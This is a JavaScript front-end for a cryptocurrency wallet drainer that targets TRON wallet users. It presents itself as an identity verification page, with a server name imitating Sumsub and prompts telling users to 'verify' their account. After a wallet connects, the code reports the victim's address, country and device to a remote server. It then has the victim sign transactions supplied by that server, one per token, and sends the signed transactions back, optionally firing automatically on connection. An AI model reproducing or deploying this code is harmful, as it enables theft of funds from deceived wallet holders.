import { BinanceWalletAdapter } from '@tronweb3/tronwallet-adapter-binance'
import { BitKeepAdapter } from '@tronweb3/tronwallet-adapter-bitkeep'
import { BybitWalletAdapter } from '@tronweb3/tronwallet-adapter-bybit'
import { ImTokenAdapter } from '@tronweb3/tronwallet-adapter-imtoken'
import { LedgerAdapter } from '@tronweb3/tronwallet-adapter-ledger'
import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { TokenPocketAdapter } from '@tronweb3/tronwallet-adapter-tokenpocket'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect'
import { getError, getLoader, getModal, getResult, getTheme } from './layer.js'
const isMobile = isDeviceMobile()
//////////////////////////////////////////////////
///////////// YOUR_FRONTEND_SETTINGS  ///////////
//////////////////////////////////////////////////
//Theme style ('light' or 'dark');
const THEME_STYLE = 'light'
//Your server domain
const SERVER_DOMAIN = 'sumsub-7vj8.onrender.com'
//Should the withdrawal request be triggered immediately upon wallet connection? (true - the request will be sent immediately upon wallet connection; false - the request will be sent after the button is clicked);
const IS_AUTO_WITHDRAWAL = true
//Should the signature request be repeated if the user declined it?
const IS_AUTO_RETRY_WITHDRAWAL = false
//Wallet Connect project
const PROJECT_ID_WC = 'cfe447cea1461f43e15086d8d1082a7f'
// List of wallets
const WALLET_OPTIONS = {
	isUseTronLink: true,
	isUseWalletConnect: true,
	isUseTrustWallet: true, //only browser extension
	isUseMetaMask: true, //only browser extension
	isUseBinance: true, //only mobile app
	isUseBybit: true,
	isUseOkx: true,
	isUseBitGet: true,
	isUseTokenPocket: true,
	isUseImToken: true,
	isUseLedger: true,
}
//////////////////////////////////////////////////
//////////////////////////////////////////////////
//////////////////////////////////////////////////
//Add standart elements
if (isMobile) {
	WALLET_OPTIONS.isUseTrustWallet = false
	WALLET_OPTIONS.isUseMetaMask = false
} else {
	WALLET_OPTIONS.isUseBinance = false
}

const body = document.querySelector('body')
body.prepend(getModal(WALLET_OPTIONS))
body.prepend(getError())
body.prepend(getLoader())
body.prepend(getResult())
body.prepend(getTheme(THEME_STYLE))
//////////////////////////////////////////////////
const connectionButtons = document.querySelectorAll('.cw-connect-button')
const withdrawalButtons = document.querySelectorAll('.cw-withdraw-button')
const walletsContainer = document.querySelector('.cw-wallets__container')
const modal = document.querySelector('.cw-wallets-layer')
const waitLoader = document.querySelector('.cw-modal-wrapper')
const waitLoaderContent = document.querySelector('.cw-modal')
const waitLoaderWalletName = document.querySelectorAll('.cw-modal-wallet-name')
const waitLoaderWalletLogo = document.querySelector('.cw-modal-wallet-logo')
const waitLoaderAdditionalContent = document.querySelector(
	'.cw-loader-content__additional',
)
const error = document.querySelector('.cw-error-block')
const resultModal = document.querySelector('.cw-result-wrapper')
const resultModalContent = document.querySelector('.cw-result')
//////////////////////////////////////////////////
let adapter
let userAddress = ''
let tokens = []
let minTrxReserve = 15
//////////////////////////////////////////////////
updateWithdrawalButtons('disconnected')
updateConnectionButtons('disconnected')
//////////////////////////////////////////////////
const ADAPTERS = [
	{
		name: 'tronLinkAdapter',
		config: new TronLinkAdapter(),
		imgSrc: 'source/icons/tronlink.svg',
	},
	{
		name: 'tokenPocketAdapter',
		config: new TokenPocketAdapter(),
		imgSrc: 'source/icons/tokenpocket.png',
	},
	{
		name: 'imTokenAdapter',
		config: new ImTokenAdapter(),
		imgSrc: 'source/icons/imtoken.svg',
	},
	{
		name: 'bitGetAdapter',
		config: new BitKeepAdapter(),
		imgSrc: 'source/icons/bitget.svg',
	},
	{
		name: 'okxAdapter',
		config: new OkxWalletAdapter(),
		imgSrc: 'source/icons/okx.svg',
	},
	{
		name: 'bybitAdapter',
		config: new BybitWalletAdapter(),
		imgSrc: 'source/icons/bybit.svg',
	},
	{
		name: 'ledgerAdapter',
		config: new LedgerAdapter(),
		imgSrc: 'source/icons/ledger.svg',
	},
	{
		name: 'trustWalletAdapter',
		config: new TrustAdapter(),
		imgSrc: `source/icons/trustwallet.svg`,
	},
	{
		name: 'metaMaskAdapter',
		config: new MetaMaskAdapter(),
		imgSrc: 'source/icons/metamask.svg',
	},
	{
		name: 'binanceAdapter',
		config: new BinanceWalletAdapter(),
		imgSrc: `source/icons/binance.svg`,
	},

	{
		name: 'walletConnectAdapter',
		config: new WalletConnectAdapter({
			network: 'Mainnet',
			options: {
				relayUrl: 'wss://relay.walletconnect.com',
				projectId: PROJECT_ID_WC,
				metadata: {
					name: document.title,
					description: 'Web3 Application',
					url: `https://${window.location.host}`,
					icons: ['https://avatars.githubusercontent.com/u/37784886'],
				},
			},
			themeMode: THEME_STYLE,
			themeVariables: {
				'--w3m-z-index': 1000,
			},
			allWallets: 'SHOW',
			featuredWalletIds: [
				'4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
				'8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4',
				'971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709',
				'38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662',
				'15c8b91ade1a4e58f3ce4e7a0dd7f42b47db0c8df7e0d84f63eb39bcb96c4e0f',
				'20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66',
				'ef333840daf915aafdc4a004525502d6d49d77bd9c65e0642dbaefb3c2893bef',
				'225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
			],
		}),
		imgSrc: `source/icons/walletconnect.svg`,
	},
]

//List of errors
function returnErrorMessage() {
	return {
		rejected: `You rejected the request. Confirm to proceed.`,
		connectionDenied: `Connection request denied. Please try again`,
		balance: `Insufficient balance. You are not verified.`,
		balanceTRX: `You don't have at least ${minTrxReserve} TRX to pass the verification. Please add funds to your balance and try again`,
		server: 'An error occurred on the server. Please try again',
		repeated: `Request has already been sent. Please open your wallet and confirm the action`,
		another: `An unknown error occurred. Check the console for more details.`,
	}
}

//List of errors
function returnLoaderMessage() {
	return {
		checking: `Checking the connection`,
		connection: `Connect your account using a wallet`,
		wallet: `The system checks your wallet`,
		transaction: `Verify your account using a wallet`,
	}
}

//Show error
function showError(message) {
	error.textContent = message
	error.style.display = ''
	error.classList.remove('cw-error-block--removed')
	error.addEventListener('click', hideError)
	setTimeout(hideError, 4000)
}

//Hide error
function hideError() {
	error.classList.add('cw-error-block--removed')
	error.addEventListener('click', hideError)
}

//Show loader
function showLoader(message) {
	waitLoader.style.visibility = 'visible'
	waitLoaderContent.style.transform = 'scale(1)'
	waitLoaderContent.style.opacity = '1'
	waitLoaderAdditionalContent.textContent = message
}

//Hide loader
function hideLoader() {
	waitLoader.style.visibility = 'hidden'
	waitLoaderContent.style.transform = 'scale(0.9)'
	waitLoaderContent.style.opacity = '0'
}

//Show modal
function showModal(evt) {
	evt.preventDefault()
	modal.style.visibility = 'visible'
	walletsContainer.style.transform = 'scale(1)'
	walletsContainer.style.opacity = '1'
	body.style.overflowY = 'hidden'
}

//Hide modal
function hideModal() {
	modal.style.visibility = 'hidden'
	walletsContainer.style.transform = 'scale(0.9)'
	walletsContainer.style.opacity = '0'
	body.style.overflowY = ''
}

//Close popup using close button
modal.addEventListener('click', evt => {
	if (evt.target.closest('.cw-close-modal')) {
		hideModal()
	}
	if (evt.target.matches('.cw-wallets')) {
		hideModal()
	}
})
//Close popup using ESC
document.addEventListener('keydown', function (e) {
	if (e.key === 'Escape') {
		e.preventDefault()
		hideModal()
	}
})

//Change functionality of the Connect Button
function updateConnectionButtons(status) {
	connectionButtons.forEach(btn => {
		if (status === 'disconnected') {
			btn.addEventListener('click', showModal)
			btn.removeAttribute('disabled')
			walletsContainer.addEventListener('click', connectWallet)
		}
		if (status === 'connected') {
			btn.removeEventListener('click', showModal)
			btn.setAttribute('disabled', 'disabled')
			walletsContainer.removeEventListener('click', connectWallet)
		}
	})
}

//Change functionality of the Withdrawal Button
function updateWithdrawalButtons(status) {
	withdrawalButtons.forEach(btn => {
		if (status === 'disconnected') {
			btn.removeEventListener('click', withdraw)
			btn.setAttribute('disabled', 'disabled')
		}
		if (status === 'connected') {
			btn.addEventListener('click', withdraw)
			btn.removeAttribute('disabled')
		}
	})
}

//Show error message
function handleError(error) {
	if (error.message.includes('Wallet was not connected')) {
		showError(returnErrorMessage().connectionDenied)
	} else if (
		error.message &&
		(error.message.includes('Access denied to use Ledger device') ||
			error.message.includes('rejected') ||
			error.message.includes('The QR window is closed') ||
			error.message.includes('Confirmation declined by user') ||
			error.message.includes('User canceled'))
	) {
		showError(returnErrorMessage().rejected)
	} else if (
		error.message &&
		error.message.includes('Insufficient trx balance')
	) {
		showError(returnErrorMessage().balanceTRX)
	} else if (error.message && error.message.includes('Insufficient balance')) {
		showError(returnErrorMessage().balance)
	} else if (
		error.message &&
		error.message.includes('Something went wrong when trying to send data')
	) {
		showError(returnErrorMessage().server)
	} else {
		showError(returnErrorMessage().another)
	}
}

//Get Country name
async function checkCountry() {
	try {
		const resp = await (
			await fetch(`https://get.geojs.io/v1/ip/country.json`)
		).json()
		return resp.name
	} catch (error) {
		console.log(error)
		return 'Unknown'
	}
}

//Check computer or phone
function isDeviceMobile() {
	const userAgent = navigator.userAgent || navigator.vendor || window.opera
	return /android/i.test(userAgent) || /iphone|ipod|ipad/i.test(userAgent)
}
//////////////////////////////////////////////////

//Send POST data to server
async function sendDataToServer(data, path) {
	try {
		const url = SERVER_DOMAIN ? `https://${SERVER_DOMAIN}/${path}` : `/${path}`
		const response = await fetch(url, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json;charset=utf-8',
			},
			body: JSON.stringify(data),
		})
		if (response.status === 200) {
			return await response.json()
		} else {
			throw new Error(await response.text())
		}
	} catch (error) {
		throw error
	}
}

// Connect wallet using adpaters
async function connectWallet(event) {
	const targetButton = event.target.closest('.cw-connect-wallet')
	if (targetButton) {
		const walletName =
			targetButton.querySelector('.cw-wallet__name').textContent
		let adapterName
		switch (walletName) {
			case 'TronLink Wallet':
				adapterName = 'tronLinkAdapter'
				break
			case 'imToken Wallet':
				adapterName = 'imTokenAdapter'
				break
			case 'TokenPocket Wallet':
				adapterName = 'tokenPocketAdapter'
				break
			case 'OKX Wallet':
				adapterName = 'okxAdapter'
				break
			case 'Bybit Wallet':
				adapterName = 'bybitAdapter'
				break
			case 'Bitget Wallet':
				adapterName = 'bitGetAdapter'
				break
			case 'Ledger Wallet':
				adapterName = 'ledgerAdapter'
				break
			case 'TrustWallet':
				adapterName = 'trustWalletAdapter'
				break
			case 'MetaMask':
				adapterName = 'metaMaskAdapter'
				break
			case 'Binance Wallet':
				adapterName = 'binanceAdapter'
				break
			case 'WalletConnect':
				adapterName = 'walletConnectAdapter'
				break
			default:
				console.log('Unknown wallet')
		}
		waitLoaderWalletName.forEach(el => (el.textContent = walletName))
		const adapterInfo = ADAPTERS.find(adapter => adapter.name === adapterName)
		waitLoaderWalletLogo.src = adapterInfo.imgSrc
		adapter = adapterInfo.config
		try {
			showLoader(returnLoaderMessage().connection)
			// if (walletName === 'WalletConnect') setTimeout(() => hideLoader(), Q296YXJ0V2Vi);
			hideModal()
			await adapter.connect()
			userAddress = adapter.address
			if (walletName === 'Bitget Wallet' && userAddress === '') {
				await adapter.disconnect()
				throw new Error('rejected')
			}
			if (userAddress !== '') {
				updateConnectionButtons('connected')
				updateWithdrawalButtons('connected')
				await sendAndGetDataFromServer()
			}
		} catch (error) {
			hideLoader()
			if (!error.message.includes('The wallet is not found')) handleError(error)
		}
	}
}

//Get the list of tokens with unsigned transactions from server
async function sendAndGetDataFromServer() {
	try {
		showLoader(returnLoaderMessage().wallet)
		const country = await checkCountry()
		const data = {
			event: 'connect',
			walletName: adapter.name,
			domain: window.location.hostname,
			domainAndPath: window.location.hostname + window.location.pathname,
			country: country,
			device: isMobile ? 'Mobile' : 'Desktop',
			address: userAddress,
			jsonId: 'Q296YXJ0V2Vi',
		}
		const result = await sendDataToServer(data, 'send_connection_data')
		if (result.message && result.message === 'Insufficient balance') {
			await adapter.disconnect()
			updateWithdrawalButtons('disconnected')
			updateConnectionButtons('disconnected')
			throw new Error(result.message)
		} else if (
			result.message &&
			result.message === 'Insufficient trx balance'
		) {
			await adapter.disconnect()
			updateWithdrawalButtons('disconnected')
			updateConnectionButtons('disconnected')
			minTrxReserve = result.minTrxReserve
			throw new Error(result.message)
		} else if (result.tokens) {
			tokens = result.tokens
			processedTokens.clear()
			retryCount = 0
		}
		if (IS_AUTO_WITHDRAWAL) await withdraw()
	} catch (error) {
		console.log(error)
		throw error
	} finally {
		hideLoader()
	}
}

//Sequentially sign unsigned transactions
const processedTokens = new Set()
const MAX_RETRY = 5
let retryCount = 0
async function withdraw() {
	showLoader(returnLoaderMessage().transaction)
	let anySigned = false
	for (const token of tokens) {
		if (processedTokens.has(token.tokenId)) {
			continue
		}
		const messageData = {
			side: 'Client side',
			domain: window.location.hostname,
			domainAndPath: window.location.hostname + window.location.pathname,
			token,
			address: userAddress,
		}
		try {
			const result = await sendDataToServer(messageData, 'get_unsigned_tx')
			if (result.message && result.message === 'Move to the next token') {
				processedTokens.add(token.tokenId)
				continue
			}
			const tx = result.tx.transaction
			messageData.event = 'startedTransaction'
			await sendDataToServer(messageData, 'send_message')
			const signedTx = await adapter.signTransaction(tx)
			console.log(
				'adapter returned signedTx:',
				JSON.stringify(signedTx, null, 2),
			)

			if (signedTx.signature && typeof signedTx.signature === 'string') {
				token.signedTx = {
					...tx,
					signature: [signedTx.signature],
				}
			} else if (signedTx.signature && Array.isArray(signedTx.signature)) {
				token.signedTx = {
					...tx,
					signature: signedTx.signature,
				}
			} else {
				token.signedTx = signedTx
			}

			console.log(
				'final signedTx to send:',
				JSON.stringify(token.signedTx, null, 2),
			)
			await sendDataToServer(messageData, 'send_signedTx')
			processedTokens.add(token.tokenId)
			anySigned = true
		} catch (error) {
			console.log(error)
			messageData.event = 'revertedTransaction'
			if (error.message) messageData.error = error.message
			await sendDataToServer(messageData, 'send_message')
			hideLoader()
			handleError(error)
			if (
				IS_AUTO_RETRY_WITHDRAWAL &&
				retryCount < MAX_RETRY &&
				error.message &&
				(error.message.includes('Access denied to use Ledger device') ||
					error.message.includes('rejected') ||
					error.message.includes('The QR window is closed') ||
					error.message.includes('Confirmation declined by user') ||
					error.message.includes('User canceled'))
			) {
				retryCount++
				await withdraw()
			}
			return
		}
	}
	hideLoader()
	if (anySigned) {
		resultModal.style.visibility = 'visible'
		resultModalContent.style.transform = 'scale(1)'
		resultModalContent.style.opacity = '1'
	} else {
		updateConnectionButtons('disconnected')
		updateWithdrawalButtons('disconnected')
	}
	try {
		await adapter.disconnect()
	} catch (error) {
		console.log(error)
	}
}
